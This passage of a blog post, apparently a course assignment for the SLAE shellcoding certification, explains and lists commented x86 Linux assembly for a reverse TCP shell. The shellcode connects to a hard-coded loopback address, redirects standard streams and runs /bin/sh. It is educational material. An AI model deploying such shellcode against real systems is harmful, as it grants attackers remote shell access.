<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=twitter:title content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta itemprop=name content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta name=application-name content="dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-21T13:33:37Z"><meta property="article:published_time" content="2020-01-21T13:33:37Z"><base href=https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/><link rel=canonical href=https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/ itemprop=url><meta name=url content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/"><meta name=twitter:url content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/"><meta property="og:url" content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Reverse TCP shell"><meta itemprop=description content="Reverse TCP shell"><meta property="og:description" content="Reverse TCP shell"><meta name=twitter:description content="Reverse TCP shell"><meta itemprop=image content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/hacker2.jpg"><meta property="og:image" content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/hacker2.jpg"><meta name=twitter:image content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/hacker2.jpg"><meta name=twitter:image:src content="https://dubell.io/slae-2-creating-a-reverse-tcp-shell-in-x86-assembly/hacker2.jpg"><meta property="og:updated_time" content="2020-01-21T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.iositemap.xml><title>dubell.io | SLAE 2: Creating a reverse TCP shell in x86 Assembly</title></head><body><div class=container><div id=particles-js></div><div class=row><div class=col><header style=text-align:center><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></header></div></div><div class=row><div class=col style=text-align:center><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=row><div class=content><article><div class=row><div class=col><h1>SLAE 2: Creating a reverse TCP shell in x86 Assembly</h1><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 21, 2020 â€¢ 7 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p></div></div><div class=row><div class=col><div id=article-content><p><strong>What is a reverse TCP shell?</strong></p><p>A reverse TCP shell is a program that instead of listening for incoming connections, the program will connect to a remote system and provide a local shell. This is useful in situations where the victim system is behind NAT, meaning you can&rsquo;t directly connect to it, instead the server will connect to you. For this reason, reverse TCP shells are usually prefered over bind shells.</p><h2 id=okey-lets-do-this-leeeerooooyyy-jeeeeeenkins>Okey let&rsquo;s do this, leeeerooooyyy jeeeeeenkins</h2><p>Our previous article followed these steps to create a bind shell:</p><ol><li>Create a socket</li><li>Bind the socket</li><li>Listen for connections</li><li>Accept new connections</li><li>Execute shell</li></ol><p>This program will only need the following steps:</p><ol><li>Create a socket</li><li>Connect to remote system</li><li>Execute shell</li></ol><p>As can be seen, the reverse shell requires less steps and less code in order to function. For this assignment, I did not create a reference program in C, because most of the code was borrowed from our previous bind shell article. The only new code section in this assignment is the connect() function.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff0086;font-weight:700>global</span> <span style=color:#0086d2>_start</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff0086;font-weight:700>section</span> <span style=color:#0086d2>.text</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>_start:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; zero out registers
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>eax</span>, <span style=color:#0086d2>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>edx</span>, <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; -------------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup socket
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x66</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; __NR_socketcall 102
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>bl</span>, <span style=color:#0086f7;font-weight:700>0x1</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; SYS_SOCKET
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup socket
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Resulting file descriptor is saved to eax
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Arguments are located top of the stack
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Tell the kernel it&#39;s time to boogie
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>edi</span>, <span style=color:#0086d2>eax</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; $eax contains the file descriptor created by socket(), store it in $edi for now
</span></span></span></code></pre></div><p>After setting up the socketcall wrapper to call connect(), we need to setup the necessary arguments for <code>connect()</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; ---------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup connect
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x66</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>bl</span>, <span style=color:#0086f7;font-weight:700>0x3</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; SYS_CONNECT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; setup sockaddr struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0xfeffff80</span>                 <span style=color:#080;background-color:#0f140f;font-style:italic>; 1.0.0.127
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>dword</span> [<span style=color:#0086d2>esp</span>], <span style=color:#0086f7;font-weight:700>0xffffffff</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; xor IP with key 0xff to get real ip
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>word</span> <span style=color:#0086f7;font-weight:700>0x3905</span>        <span style=color:#080;background-color:#0f140f;font-style:italic>; htons(1337)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>word</span> <span style=color:#0086f7;font-weight:700>0x2</span>           <span style=color:#080;background-color:#0f140f;font-style:italic>; AF_INET
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Store the address that points to our struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Push the arguments for connect()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x10</span>        <span style=color:#080;background-color:#0f140f;font-style:italic>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>ecx</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Points to our sockaddr_in struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edi</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Contains our file descriptor
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>esp</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; Second parameter for socketcall, points to arguments required by connect()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>         <span style=color:#080;background-color:#0f140f;font-style:italic>; Tell the kernel let&#39;s go!
</span></span></span></code></pre></div><p>The connect() code section is very similar to the setup needed for listen(), which can be seen in the previous bind shell article. The difference here is that we are specifying an IP to connect to. In order to avoid null bytes, the IP address is XORed with <code>0xffffffff</code>. This solution is not bulletproof, because if an IP would contain a <code>0xFF</code>, the result of the XOR operation would be <code>0x00</code>.</p><p>Now we use <code>dup2()</code> to set STDIN, STDOUT, STDERR to our file descriptor, and execute <code>/bin/sh</code>. This will expose a local shell to the connected socket, thereby acheiving a remote TCP shell.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>redirect:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; --------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup dup2
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stdin
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; syscall number dup2 63 --&gt; 0x3f
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>edi</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; peer&#39;s file descriptor
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>edx</span>     <span style=color:#080;background-color:#0f140f;font-style:italic>; STDIN
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stdout
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>cl</span>, <span style=color:#0086f7;font-weight:700>0x1</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; STDOUT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; redirect to stderr
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0x3f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>cl</span>, <span style=color:#0086f7;font-weight:700>0x2</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; STDERR
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>shell:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; --------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; # Setup execv
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>edx</span>, <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086d2>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; push //bin/sh onto the stack
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x68732f6e</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    <span style=color:#ff0086;font-weight:700>push</span> <span style=color:#0086f7;font-weight:700>0x69622f2f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; Set address of esp to ebx, which points
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#080;background-color:#0f140f;font-style:italic>; to //bin/sh
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>ebx</span>, <span style=color:#0086d2>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>ecx</span>, <span style=color:#0086d2>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>    <span style=color:#ff0086;font-weight:700>xor</span> <span style=color:#0086d2>eax</span>, <span style=color:#0086d2>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>    <span style=color:#ff0086;font-weight:700>mov</span> <span style=color:#0086d2>al</span>, <span style=color:#0086f7;font-weight:700>0xb</span>      <span style=color:#080;background-color:#0f140f;font-style:italic>; execv syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    <span style=color:#ff0086;font-weight:700>int</span> <span style=color:#0086f7;font-weight:700>0x80</span>
</span></span></code></pre></div><p><strong>Final code:</strong></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>;---------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#080;background-color:#0f140f;font-style:italic>; Author: dubs3c
